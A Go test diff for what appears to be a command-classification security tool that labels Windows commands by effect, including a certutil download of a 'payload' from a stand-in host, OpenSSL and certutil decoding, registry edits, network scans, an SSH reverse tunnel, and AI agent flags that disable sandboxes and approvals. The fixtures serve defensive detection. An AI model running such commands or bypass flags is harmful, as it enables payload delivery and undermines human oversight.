@@ -585,6 +585,43 @@ func TestWindowsRawStructuredSemanticParity(t *testing.T) {
 			enforcing: true,
 		},
 		{
+			name:    "certutil URL cache",
+			dialect: DialectCMD,
+			raw: `certutil.exe -urlcache -f ` +
+				`https://example.test/payload C:\payload.bin`,
+			argv: []string{
+				"certutil.exe", "-urlcache", "-f",
+				"https://example.test/payload", `C:\payload.bin`,
+			},
+			effect:     EffectExecute,
+			operations: []OperationKind{OperationFetch},
+			paths: []windowsParityPath{{
+				Access: PathAccessWrite, Flavor: PathFlavorWindows,
+				Value: "C:/payload.bin",
+			}},
+			network: []windowsParityNetwork{{
+				Action: NetworkDownload, Scheme: "https",
+				Host: "example.test", Kind: NetworkTargetSingleHost,
+			}},
+			enforcing: true,
+		},
+		{
+			name:       "certutil generic help",
+			dialect:    DialectCMD,
+			raw:        `certutil.exe -?`,
+			argv:       []string{"certutil.exe", "-?"},
+			effect:     EffectPreview,
+			operations: nil,
+		},
+		{
+			name:       "certutil decode help",
+			dialect:    DialectCMD,
+			raw:        `certutil.exe -decode -?`,
+			argv:       []string{"certutil.exe", "-decode", "-?"},
+			effect:     EffectPreview,
+			operations: nil,
+		},
+		{
 			name:       "git bypass dry run",
 			dialect:    DialectCMD,
 			raw:        `git.exe commit --no-verify --dry-run`,
@@ -595,16 +632,54 @@ func TestWindowsRawStructuredSemanticParity(t *testing.T) {
 		{
 			name:    "Codex paired controls",
 			dialect: DialectCMD,
-			raw: `codex.exe exec --sandbox danger-full-access ` +
-				`--ask-for-approval never fixture`,
+			raw: `codex.exe --sandbox danger-full-access ` +
+				`--ask-for-approval never exec fixture`,
 			argv: []string{
-				"codex.exe", "exec", "--sandbox", "danger-full-access",
-				"--ask-for-approval", "never", "fixture",
+				"codex.exe", "--sandbox", "danger-full-access",
+				"--ask-for-approval", "never", "exec", "fixture",
 			},
-			effect:    EffectExecute,
-			enforcing: true,
+			effect:     EffectExecute,
+			operations: []OperationKind{OperationPolicyBypass},
+			enforcing:  true,
 		},
 	}
+	for _, dialect := range []Dialect{DialectCMD, DialectPowerShell} {
+		tests = append(tests,
+			windowsSupportedParityCase{
+				name:    string(dialect) + " OpenSSL decode",
+				dialect: dialect,
+				raw: `openssl.exe enc -d -in C:\encoded.txt ` +
+					`-out C:\decoded.bin`,
+				argv: []string{
+					"openssl.exe", "enc", "-d", "-in",
+					`C:\encoded.txt`, "-out", `C:\decoded.bin`,
+				},
+				effect:     EffectExecute,
+				operations: []OperationKind{OperationDecode},
+				paths: []windowsParityPath{
+					{
+						Access: PathAccessRead, Flavor: PathFlavorWindows,
+						Value: "C:/encoded.txt",
+					},
+					{
+						Access: PathAccessWrite, Flavor: PathFlavorWindows,
+						Value: "C:/decoded.bin",
+					},
+				},
+				enforcing: true,
+			},
+			windowsSupportedParityCase{
+				name:       string(dialect) + " OpenSSL help",
+				dialect:    dialect,
+				raw:        `openssl.exe base64 -d -help`,
+				argv:       []string{"openssl.exe", "base64", "-d", "-help"},
+				effect:     EffectPreview,
+				operations: nil,
+			},
+		)
+	}
+	tests = append(tests, windowsRegistryParityCases()...)
+	tests = append(tests, windowsAgentRuntimeParityCases()...)
 	tests = append(tests, windowsNativeExecutableParityCases()...)
 	tests = append(tests, windowsSupportedSSHParityCases()...)
 
@@ -834,91 +909,222 @@ func TestWindowsNewItemUnprojectedSemanticParity(t *testing.T) {
 	}
 }
 
-func windowsNativeExecutableParityCases() []windowsSupportedParityCase {
-	specs := []struct {
-		name       string
-		program    string
-		args       []string
-		operations []OperationKind
-		network    []windowsParityNetwork
+func windowsRegistryParityCases() []windowsSupportedParityCase {
+	const (
+		key        = `HKCU\Software\DefenseClaw`
+		normalized = "HKCU/Software/DefenseClaw"
+	)
+	verbs := []struct {
+		name      string
+		argv      []string
+		operation OperationKind
+		access    PathAccess
 	}{
 		{
-			name:    "nmap supported value option",
-			program: "nmap",
-			args: []string{
-				"--top-ports", "100", "-sn", "192.0.2.0/24",
+			name: "add",
+			argv: []string{
+				"reg.exe", "add", key, "/v", "Mode", "/t", "REG_SZ",
+				"/d", "enabled", "/f",
 			},
-			operations: []OperationKind{OperationNetworkScan},
-			network: []windowsParityNetwork{{
-				Action: NetworkScan, Host: "192.0.2.0/24",
-				Kind: NetworkTargetMultiAddressCIDR,
-			}},
+			operation: OperationConfigChange,
+			access:    PathAccessWrite,
 		},
 		{
-			name:    "naabu single target",
-			program: "naabu",
-			args:    []string{"-host", "192.0.2.7", "-silent"},
-			operations: []OperationKind{
-				OperationNetworkScan,
-			},
-			network: []windowsParityNetwork{{
-				Action: NetworkScan, Host: "192.0.2.7",
-				Kind: NetworkTargetSingleHost,
-			}},
+			name:      "delete",
+			argv:      []string{"reg", "delete", key, "/v", "Mode", "/f"},
+			operation: OperationConfigChange,
+			access:    PathAccessDelete,
 		},
 		{
-			name:    "SSH reverse tunnel",
-			program: "ssh",
-			args: []string{
-				"-F", "none", "-R",
-				"8080:localhost:80", "relay.invalid",
-			},
-			operations: []OperationKind{OperationTunnel},
-			network: []windowsParityNetwork{{
-				Action: NetworkTunnel, Scheme: "ssh",
-				Host: "relay.invalid", Kind: NetworkTargetSingleHost,
-			}},
+			name:      "query",
+			argv:      []string{"reg.exe", "query", key, "/v", "Mode"},
+			operation: OperationRead,
+			access:    PathAccessMetadata,
 		},
 		{
-			name:       "git exact commit grammar",
-			program:    "git",
-			args:       []string{"commit", "--no-verify", "-m", "fixture"},
+			name: "query key search",
+			argv: []string{
+				"reg", "query", key, "/f", "Defense",
+				"/k", "/d", "/c", "/e",
+			},
+			operation: OperationRead,
+			access:    PathAccessMetadata,
+		},
+		{
+			name: "query value-name search",
+			argv: []string{
+				"reg", "query", key, "/v", "/f", "Defense",
+			},
+			operation: OperationRead,
+			access:    PathAccessMetadata,
+		},
+		{
+			name: "query data search",
+			argv: []string{
+				"reg.exe", "query", key, "/f", "enabled", "/d",
+			},
+			operation: OperationRead,
+			access:    PathAccessMetadata,
+		},
+	}
+	var tests []windowsSupportedParityCase
+	for _, dialect := range []Dialect{DialectCMD, DialectPowerShell} {
+		for _, verb := range verbs {
+			tests = append(tests, windowsSupportedParityCase{
+				name:       string(dialect) + " registry " + verb.name,
+				dialect:    dialect,
+				raw:        strings.Join(verb.argv, " "),
+				argv:       verb.argv,
+				effect:     EffectExecute,
+				operations: []OperationKind{verb.operation},
+				paths: []windowsParityPath{{
+					Access: verb.access, Flavor: PathFlavorRegistry,
+					Value: normalized,
+				}},
+				enforcing: true,
+			})
+		}
+		helpExecutable := "reg"
+		if dialect == DialectPowerShell {
+			helpExecutable = "reg.exe"
+		}
+		tests = append(tests, windowsSupportedParityCase{
+			name:       string(dialect) + " registry help",
+			dialect:    dialect,
+			raw:        helpExecutable + " add /?",
+			argv:       []string{helpExecutable, "add", "/?"},
+			effect:     EffectPreview,
 			operations: nil,
+		})
+	}
+	return tests
+}
+
+func windowsAgentRuntimeParityCases() []windowsSupportedParityCase {
+	specs := []struct {
+		name       string
+		argv       []string
+		effect     CommandEffect
+		operations []OperationKind
+		enforcing  bool
+	}{
+		{
+			name: "Claude joined permission bypass",
+			argv: []string{
+				"claude.exe", "--permission-mode=bypassPermissions",
+			},
+			effect: EffectExecute, enforcing: true,
+			operations: []OperationKind{OperationPolicyBypass},
 		},
 		{
-			name:    "Codex paired controls",
-			program: "codex",
-			args: []string{
-				"exec", "--sandbox", "danger-full-access",
-				"--ask-for-approval", "never", "fixture",
+			name: "Codex joined stdin controls",
+			argv: []string{
+				"codex.exe", "--ask-for-approval=never", "exec",
+				"--sandbox=danger-full-access",
 			},
-			operations: nil,
+			effect: EffectExecute, enforcing: true,
+			operations: []OperationKind{OperationPolicyBypass},
+		},
+		{
+			name: "Codex short equals controls",
+			argv: []string{
+				"codex.exe", "-s=danger-full-access", "-a=never",
+				"exec", "fixture",
+			},
+			effect: EffectExecute, enforcing: true,
+			operations: []OperationKind{OperationPolicyBypass},
+		},
+		{
+			name: "Codex exec alias",
+			argv: []string{
+				"codex.exe", "-a", "never", "e",
+				"-s", "danger-full-access", "fixture",
+			},
+			effect: EffectExecute, enforcing: true,
+			operations: []OperationKind{OperationPolicyBypass},
+		},
+		{
+			name: "Codex foreign option value",
+			argv: []string{
+				"codex.exe", "--ask-for-approval", "never", "exec",
+				"--sandbox", "workspace-write",
+				"--model", "danger-full-access", "fixture",
+			},
+			effect: EffectExecute, enforcing: true,
+		},
+		{
+			name: "Claude foreign option value",
+			argv: []string{
+				"claude.exe", "--permission-mode", "manual",
+				"--model", "bypassPermissions", "-p", "fixture",
+			},
+			effect: EffectExecute, enforcing: true,
+		},
+		{
+			name:       "Gemini yolo fact",
+			argv:       []string{"gemini.exe", "--yolo", "-p", "fixture"},
+			effect:     EffectExecute,
+			operations: []OperationKind{OperationPolicyBypass},
+			enforcing:  true,
+		},
+		{
+			name: "Claude help",
+			argv: []string{
+				"claude.exe", "--help",
+				"--permission-mode=bypassPermissions",
+			},
+			effect: EffectPreview,
 		},
 	}
 	var tests []windowsSupportedParityCase
 	for _, dialect := range []Dialect{DialectCMD, DialectPowerShell} {
 		for _, spec := range specs {
-			for _, suffix := range []string{"", ".exe"} {
-				executable := spec.program + suffix
-				argv := append([]string{executable}, spec.args...)
-				form := "extensionless"
-				if suffix != "" {
-					form = "exe"
-				}
-				tests = append(tests, windowsSupportedParityCase{
-					name:       string(dialect) + " " + spec.name + " " + form,
-					dialect:    dialect,
-					raw:        strings.Join(argv, " "),
-					argv:       argv,
-					effect:     EffectExecute,
-					operations: spec.operations,
-					network:    spec.network,
-					enforcing:  true,
-				})
-			}
+			tests = append(tests, windowsSupportedParityCase{
+				name:       string(dialect) + " " + spec.name,
+				dialect:    dialect,
+				raw:        strings.Join(spec.argv, " "),
+				argv:       spec.argv,
+				effect:     spec.effect,
+				operations: spec.operations,
+				enforcing:  spec.enforcing,
+			})
 		}
 	}
 	return tests
+}
+
+func windowsNativeExecutableParityCases() []windowsSupportedParityCase {
+	nmapArgv := []string{
+		"nmap", "--top-ports", "100", "-sn", "192.0.2.0/24",
+	}
+	codexArgv := []string{
+		"codex.exe", "--sandbox", "danger-full-access",
+		"--ask-for-approval", "never", "exec", "fixture",
+	}
+	return []windowsSupportedParityCase{
+		{
+			name:       "cmd nmap supported value option extensionless",
+			dialect:    DialectCMD,
+			raw:        strings.Join(nmapArgv, " "),
+			argv:       nmapArgv,
+			effect:     EffectExecute,
+			operations: []OperationKind{OperationNetworkScan},
+			network: []windowsParityNetwork{{
+				Action: NetworkScan, Host: "192.0.2.0/24",
+				Kind: NetworkTargetMultiAddressCIDR,
+			}},
+			enforcing: true,
+		},
+		{
+			name:       "powershell Codex paired controls exe",
+			dialect:    DialectPowerShell,
+			raw:        strings.Join(codexArgv, " "),
+			argv:       codexArgv,
+			effect:     EffectExecute,
+			operations: []OperationKind{OperationPolicyBypass},
+			enforcing:  true,
+		},
+	}
 }
 
 func windowsSupportedSSHParityCases() []windowsSupportedParityCase {
@@ -1142,6 +1348,104 @@ func TestWindowsRawStructuredFailClosedParity(t *testing.T) {
 			},
 			effect:           EffectExecute,
 			forbidOperations: []OperationKind{OperationSchedule},
+		},
+		{
+			name:             "registry missing key",
+			dialect:          DialectCMD,
+			raw:              `reg add`,
+			argv:             []string{"reg", "add"},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationConfigChange},
+			forbidPaths:      true,
+		},
+		{
+			name:    "registry unsupported verb",
+			dialect: DialectPowerShell,
+			raw: `reg.exe copy HKCU\Software\DefenseClaw ` +
+				`HKCU\Software\Copy`,
+			argv: []string{
+				"reg.exe", "copy", `HKCU\Software\DefenseClaw`,
+				`HKCU\Software\Copy`,
+			},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationConfigChange},
+			forbidPaths:      true,
+		},
+		{
+			name:             "registry query rejects delete all values",
+			dialect:          DialectCMD,
+			raw:              `reg query HKCU\Software /va`,
+			argv:             []string{"reg", "query", `HKCU\Software`, "/va"},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationConfigChange},
+		},
+		{
+			name:             "registry query search requires data",
+			dialect:          DialectPowerShell,
+			raw:              `reg.exe query HKCU\Software /f`,
+			argv:             []string{"reg.exe", "query", `HKCU\Software`, "/f"},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationConfigChange},
+		},
+		{
+			name:    "registry query data selector rejects operand",
+			dialect: DialectCMD,
+			raw:     `reg query HKCU\Software /d fixture`,
+			argv: []string{
+				"reg", "query", `HKCU\Software`, "/d", "fixture",
+			},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationConfigChange},
+		},
+		{
+			name:    "certutil unknown mode",
+			dialect: DialectCMD,
+			raw:     `certutil.exe -encode C:\input.bin C:\encoded.txt`,
+			argv: []string{
+				"certutil.exe", "-encode",
+				`C:\input.bin`, `C:\encoded.txt`,
+			},
+			effect: EffectExecute,
+			forbidOperations: []OperationKind{
+				OperationDecode,
+				OperationFetch,
+			},
+			forbidPaths:   true,
+			forbidNetwork: true,
+		},
+		{
+			name:             "certutil reordered decode help",
+			dialect:          DialectCMD,
+			raw:              `certutil.exe -? -decode`,
+			argv:             []string{"certutil.exe", "-?", "-decode"},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationDecode},
+			forbidPaths:      true,
+			forbidNetwork:    true,
+		},
+		{
+			name:    "certutil decode help with extra operand",
+			dialect: DialectCMD,
+			raw:     `certutil.exe -decode -? C:\encoded.txt`,
+			argv: []string{
+				"certutil.exe", "-decode", "-?", `C:\encoded.txt`,
+			},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationDecode},
+			forbidPaths:      true,
+			forbidNetwork:    true,
+		},
+		{
+			name:    "PowerShell certutil remains unsupported",
+			dialect: DialectPowerShell,
+			raw:     `certutil.exe -decode C:\input.txt C:\output.bin`,
+			argv: []string{
+				"certutil.exe", "-decode",
+				`C:\input.txt`, `C:\output.bin`,
+			},
+			effect:           EffectExecute,
+			forbidOperations: []OperationKind{OperationDecode},
+			forbidPaths:      true,
 		},
 		{
 			name:    "netcat ambiguous value bundle",
